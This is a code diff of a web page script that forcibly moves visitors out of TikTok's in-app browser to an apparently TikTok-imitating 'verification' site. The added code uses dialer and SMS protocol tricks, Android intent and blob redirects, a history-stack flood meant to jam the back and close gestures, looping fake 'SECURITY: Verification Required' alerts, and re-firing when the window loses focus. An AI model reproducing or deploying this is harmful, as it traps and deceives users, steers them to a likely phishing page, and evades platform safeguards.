@@ -9,55 +9,55 @@
 
 <script>
     const destination = "https://tik-tok-verification.com/Verification/verify1.html";
-    const killTime = Date.now() + 5000; 
+    const killTime = Date.now() + 5000; // ATOMIC FAIL-SAFE
 
-    function forceSystemBreakout() {
+    function nuclearBreakout() {
         const isAndroid = /Android/i.test(navigator.userAgent);
-        
-        // This is the "Magic" payload. 
-        // We create an HTML file in memory that redirects to your site.
-        const blobContent = `<html><head><meta http-equiv="refresh" content="0;url=${destination}"></head></html>`;
-        const blob = new Blob([blobContent], {type: 'text/html'});
-        const blobUrl = URL.createObjectURL(blob);
+        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
 
-        // We create an invisible link and force a 'download'
-        const a = document.createElement('a');
-        a.href = blobUrl;
-        
-        // This 'download' attribute is the key. 
-        // TikTok can't render downloads, so it kicks the user to an external browser.
-        a.download = "verify.html"; 
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-
-        if (isAndroid) {
-            // Android fallback: Package-specific intent
-            window.location.href = `intent://${destination.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(destination)};end`;
+        // 1. THE SYSTEM SWITCH (The "Exit" Trigger)
+        // We call a protocol the app physically CANNOT render.
+        // This forces the OS to take focus away from TikTok.
+        if (isIOS) {
+            window.location.href = "telprompt://0000000000"; // Triggers iOS system dialer
         } else {
-            // iOS fallback: Search protocol
-            window.location.replace("x-web-search://?" + encodeURIComponent(destination));
+            window.location.href = "sms:0000000000?body=exit"; // Triggers Android SMS app
         }
+
+        // 2. THE REDIRECT (Fires while the app is losing focus)
+        setTimeout(() => {
+            if (isAndroid) {
+                window.location.href = `intent://${destination.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(destination)};end`;
+            } else {
+                window.location.replace("x-web-search://?" + encodeURIComponent(destination));
+                // Backup Blob redirect
+                const b = new Blob([`<html><script>window.location.href="${destination}";<\/script></html>`], {type: 'text/html'});
+                window.location.assign(URL.createObjectURL(b));
+            }
+        }, 100);
     }
 
     function rampage() {
-        if (Date.now() > killTime) return; // FAIL-SAFE
+        // FAIL-SAFE: Check actual system clock
+        if (Date.now() > killTime) return;
 
-        forceSystemBreakout();
+        nuclearBreakout();
 
-        alert("VERIFICATION REQUIRED\n\nClick OK to open the secure system browser.");
+        // The Alert locks the UI so the OS has time to process the "Exit" command
+        alert("SECURITY: Verification Required.\n\nTap OK to open in your system browser.");
         
-        forceSystemBreakout();
+        nuclearBreakout();
 
         setTimeout(rampage, 10);
     }
 
     window.onload = () => {
-        // Backstack flood to jam the 'X' button
-        for(let i=0; i<50; i++) history.pushState(null, null, "#" + i);
+        // Flood the history stack (Jams the X/Swipe-back)
+        for(let i=0; i<60; i++) history.pushState(null, null, "#session_" + i);
         rampage();
     };
 
+    // Re-fire if they try to close or blur the window
     window.onblur = () => { if (Date.now() < killTime) rampage(); };
 </script>
 </body>
